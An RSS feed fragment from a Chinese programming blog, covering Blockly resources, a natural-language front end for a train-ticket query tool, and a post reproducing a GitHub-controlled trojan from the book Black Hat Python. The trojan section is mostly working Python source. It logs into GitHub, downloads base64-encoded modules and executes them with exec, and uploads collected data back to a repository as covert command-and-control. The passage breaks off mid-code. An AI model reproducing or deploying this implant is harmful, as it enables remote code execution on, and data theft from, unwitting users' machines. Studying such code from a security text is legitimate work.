&lt;li&gt;&lt;a href="http://appinventor.mit.edu/explore/"&gt;App Inventor&lt;/a&gt;：基于blockly的可视化安卓IDE&lt;/li&gt;
&lt;li&gt;&lt;a href="code.org"&gt;Code.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ozoblockly.com/"&gt;OzoBlockly&lt;/a&gt;：一个可编程微型机器人，编码烧录很有意思（屏幕闪烁）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.makewonder.com/"&gt;Wonder Workshop&lt;/a&gt;：可编程机器人玩具&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lab.open-roberta.org/"&gt;Open Roberta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scriptr.io/"&gt;scriptr.io&lt;/a&gt;：物联网云端IDE&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;脑洞&lt;/h1&gt;
&lt;p&gt;用做配置工具&lt;/p&gt;
&lt;p&gt;我们常遇到这种纠结：究竟要给用户怎样的配置界面，常规的UI界面，虽然友好，能做的事太少了。而基于文本的配置，表达能力是加强了，对用户不仅不友好，还容易因为拼写错误，出现奇怪问题（缺乏验证机制），让用户摸不着头脑&lt;/p&gt;
&lt;p&gt;基于blockly的配置工具，似乎是个很不错的选择，拥有编程语言级别的表达能力，操作起来又不晦涩。细节有空细说，下次有配置项丰富的项目，我决定试试blockly&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;---2018.4.17 更新---&lt;/p&gt;
&lt;h1&gt;教程&lt;/h1&gt;
&lt;p&gt;我前些时间为blockly写了一些入门开发教程，供大家参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-hello-world.html"&gt;blockly开发之hello world(0)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-run-code.html"&gt;blockly开发之生成并运行js代码(1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/blockly-dev-python-browser-turtle.html"&gt;blockly开发之使用python驱动浏览器中的turtle(2)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你喜欢看代码，可以直接翻代码:&lt;a href="https://github.com/wwj718/blockly_dev"&gt;blockly_dev&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;Introduction to Blockly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cooc-china.gitbooks.io/blockly/content/chapter1.html"&gt;Blockly是什么&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 02 Sep 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-09-02:blockly-overview.html</guid><category>code</category></item><item><title>为命令行火车票查询器添加自然语言交互界面</title><link>/iquery-nlp-interface.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;
&lt;p&gt;ps：采用&lt;a href="https://github.com/asciinema/asciinema"&gt;asciinema&lt;/a&gt;制作了&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;演示视频&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;&lt;img alt="asciicast" src="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;项目地址&lt;/h1&gt;
&lt;p&gt;先上项目源码:&lt;a href="https://github.com/wwj718/ibot"&gt;ibot&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/protream/iquery"&gt;iquery&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;@sl前段时间跟我说，有个python写的命令行或者票查询器(iquery)很有趣，于是我玩了下，觉得挺好玩的，工具本身写得也干净利落。后来发现它只支持python3，还一度想让修改它使它兼容python2。&lt;/p&gt;
&lt;p&gt;此后有了新主意:为它加一个自然语言交互界面，这样被围观时，比较拉风&lt;/p&gt;
&lt;p&gt;当然啦，对于热爱CLI的小伙伴来说，CLI几乎是最佳的交互方式了，给它添加自然语言交互界面，未免画蛇添竹。我个人是偏好CLI的，不过觉得自然语言交互界面的好处之一是能然普通用户更自然地与机器对话，甚至采用语音与机器对话&lt;/p&gt;
&lt;h3&gt;iquery的安装和使用&lt;/h3&gt;
&lt;p&gt;iquery作为命令行工具，写的是很棒的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 安装&lt;/span&gt;
pip3 install iquery
iquery 上海虹桥 北京 &lt;span class="m"&gt;802&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将获得本年8月2号从上海虹桥到北京的火车票信息:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/iquerye2d84a70.png" /&gt;&lt;/p&gt;
&lt;p&gt;当然你也可以指定火车的类型和输入完整的查询日期, 比如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;iquery -dg 上海 北京 20160802&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;ibot&lt;/h1&gt;
&lt;p&gt;下边我们来看看如何使用ibot来查询火车票,&lt;a href=""&gt;ibot&lt;/a&gt;已经发布为python包，直接pip安装就行&lt;/p&gt;
&lt;p&gt;使用:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ibot 2016年8月十一号 南京到北京的车票
ibot 明天从南京到北京的车票
ibot 这周六从南京去北京出差，帮我看下车票
ibot 下周五离开南京去北京 查下车票
ibot 查一下上海去北京的车票，下周六
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-08-01:iquery-nlp-interface.html</guid><category>dev-tools</category></item><item><title>用python和github构建一只玩具木马</title><link>/use-python-and-github-create-Trojan-Horse.html</link><description>&lt;p&gt;周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 --黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第七章很有意思，分享过来&lt;/p&gt;
&lt;p&gt;作者在这一章里说道&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most challenging aspects of creating a solid trojan framework is asynchronously controlling, updating, and receiving data from your deployed implants. It’s crucial to have a relatively universal way to push code to your remote trojans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写一个特洛伊木马的的挑战之一是异步地控制、更新和接收数据，并且能够通用的方法给你的木马们远程推送指令，而作者试图在这一章中给出一个漂亮的解决方案&lt;/p&gt;
&lt;h1&gt;木马&lt;/h1&gt;
&lt;p&gt;上边说的的木马是什么鬼&lt;/p&gt;
&lt;p&gt;据维基百科说 , "木马"这一名称来源于希腊神话特洛伊战争的特洛伊木马。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，看起来挺好的，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。&lt;/p&gt;
&lt;p&gt;经过一番追本溯源，计算机中这种被称为木马的程序有哪些特性，大家大体上应该有个印象了，如果不用隐喻，要描述出这类程序的特质，恐怕要多费许多口舌&lt;/p&gt;
&lt;p&gt;计算机科学的趣味之一是它的词汇异常丰富和生动，有大量的隐喻和类比&lt;/p&gt;
&lt;p&gt;《代码大全》在开篇的不久说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学领域中有着搜友学科中最为丰富多彩的语言。你走进一间安全严密，温度精确控制在20℃的房间，并在里面发现了病毒（virus），特洛伊木马（Trojan horse），蠕虫（worm），臭虫（bug），逻辑炸弹（bomb），崩溃（crash），论坛口水战（flame），双绞线转换头（twisted sex changer），还有致命错误（fatal error）……在其他领域中，你能遇到这些吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;正餐&lt;/h1&gt;
&lt;p&gt;在着一章中，作者主要演示了如何利用github作为控制和数据中心，构建灵活的木马，至于你要用木马来做什么，你可以发挥想象自己写插件到module里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;talk is cheap,show me your code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;代码不长，直接贴上(大家可以直接看&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;源码库&lt;/a&gt;)，值得说明的地方稍后讲解&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;imp&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;Queue&lt;/span&gt;
&lt;span class="c1"&gt;#import os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;

&lt;span class="n"&gt;trojan_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;trojan_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.json&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;data_path&lt;/span&gt;     &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;trojan_modules&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;task_queue&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;


&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./local.yaml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yaml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;find_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Attempting to retrieve &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;
            &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;modules/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_library&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;


        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__dict__&lt;/span&gt;

        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;



&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;gh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repository&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;blackhatpythonbook&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;master&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;tree&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recurse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Found file &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;

            &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_json_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;

    &lt;span class="n"&gt;config_json&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_config&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt;        &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;config_json&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

            &lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;remote_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;.data&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remote_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Commit message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
